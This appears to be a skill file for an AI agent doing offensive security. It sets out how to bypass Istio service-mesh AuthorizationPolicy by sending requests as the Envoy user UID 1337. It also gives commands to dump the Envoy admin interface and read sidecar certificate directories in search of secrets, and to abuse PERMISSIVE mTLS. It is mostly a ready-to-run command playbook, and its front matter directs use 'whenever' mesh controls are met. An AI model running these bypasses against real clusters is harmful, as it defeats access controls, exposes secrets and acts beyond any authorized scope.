---
name: k8s-istio-bypass
description: "Istio Service Mesh security policy bypass. Use when the target K8s cluster runs Istio, requests are denied by AuthorizationPolicy (403 RBAC denied), or Envoy sidecars are present. Core technique: UID 1337 Envoy bypass. Use this skill whenever Istio policy enforcement, service mesh restrictions, or Envoy-related security controls are encountered in K8s"
zh-signals: "绕过 Istio 服务网格安全策略，核心手法为利用 UID 1337 绕过 Envoy 流量拦截。信号:Istio,K8s,Envoy,UID 1337,策略绕过"
when-to-use: "Use when a Kubernetes cluster uses Istio, requests are denied by AuthorizationPolicy (403 RBAC denied), or Envoy sidecars are present and you need to bypass mesh policy enforcement."
metadata:
  tags: "k8s,kubernetes,istio,envoy,service-mesh,authorizationpolicy,bypass,policy-bypass,service-mesh"
  category: "cloud"
---

# Istio Service Mesh Security Policy Bypass

Istio implements traffic management and security policy through the Envoy sidecar. But Istio's architecture has a fundamental design flaw that can be exploited: Envoy runs as UID 1337, and the iptables rules exclude traffic from UID 1337 to avoid a dead loop — meaning requests sent under that UID bypass Envoy entirely, and no Istio policy takes effect.

## Core Technique: UID 1337 Bypass

Istio's iptables rules exclude outbound traffic from UID 1337 from interception (otherwise Envoy's own outbound traffic would also be intercepted, forming a dead loop). This design decision means:

```
Normal traffic:  Pod → iptables → Envoy (policy check) → target
UID 1337: Pod → iptables → (skip Envoy) → reach the target directly
```

### Exploitation Steps

```bash
# 1. Confirm the istio user exists
grep 1337 /etc/passwd
# istio:x:1337:1337::/home/istio:/bin/sh

# 2. Switch to the istio user
su istio
# or
su -s /bin/sh istio

# 3. Send requests as the istio identity (bypasses AuthorizationPolicy)
curl <target-service>.<namespace>.svc.cluster.local

# 4. If su is unavailable, try nsenter or runuser
runuser -u istio -- curl <target-service>
```

> Reference: https://github.com/istio/istio/issues/4286

### AuthorizationPolicy DENY Bypass Example

When the policy blocks specific HTTP methods:
```yaml
apiVersion: security.istio.io/v1beta1
kind: AuthorizationPolicy
spec:
  action: DENY
  rules:
  - to:
    - operation:
        methods: ["POST", "GET"]
```

- ❌ Switch the HTTP method (PATCH/PUT) — usually returns 400
- ✅ **Send requests as UID 1337** — fully bypasses Envoy, the policy does not apply

---

## Other Istio Exploitation Techniques

### Envoy Admin Interface

```bash
# Envoy admin interface (default 15000)
curl localhost:15000/
curl localhost:15000/config_dump  # full configuration (may contain secrets)
curl localhost:15000/clusters     # upstream cluster information
curl localhost:15000/listeners    # listener configuration
curl localhost:15000/stats        # statistics

# Pilot debug interface (default 15014)
curl localhost:15014/debug/endpointz
curl localhost:15014/debug/configz
```

### mTLS Downgrade

```bash
# If PeerAuthentication is set to PERMISSIVE (instead of STRICT)
# you can send plaintext requests without mTLS
curl http://<service>:<port>  # plaintext HTTP may be accepted
```

### Leveraging Sidecar Resources

The Envoy sidecar may have cached mTLS certificates and cluster information — combine this with `Skill(skill="k8s-sidecar-attack")` for further exploitation.

```bash
ls /etc/certs/ 2>/dev/null
ls /var/run/secrets/istio/ 2>/dev/null
cat /var/run/secrets/istio/root-cert.pem 2>/dev/null
```

---

## Reconnaissance Workflow

```bash
# 1. Confirm Istio is present
env | grep -i istio
ls /var/run/secrets/istio/ 2>/dev/null
curl -s localhost:15000/server_info 2>/dev/null | head -5

# 2. Discover target services
k8spider scan -subnet <service-cidr>

# 3. Access directly (test whether an AuthorizationPolicy blocks you)
curl -v <target-service>
# If you get 403 RBAC access denied → an AuthorizationPolicy exists

# 4. Try the UID 1337 bypass
su istio -c "curl <target-service>"

# 5. Check the Envoy admin interface
curl localhost:15000/config_dump | grep -i secret
```

---

## Key Takeaways

- **UID 1337 = Istio's "god mode"** — traffic does not pass through Envoy and is not subject to any Istio policy
- The Envoy admin interface listens on `localhost:15000` by default and may leak secrets and cluster topology
- `PeerAuthentication: PERMISSIVE` allows plaintext communication
- Istio's `AuthorizationPolicy` only takes effect at the Envoy layer — bypassing Envoy = bypassing every policy
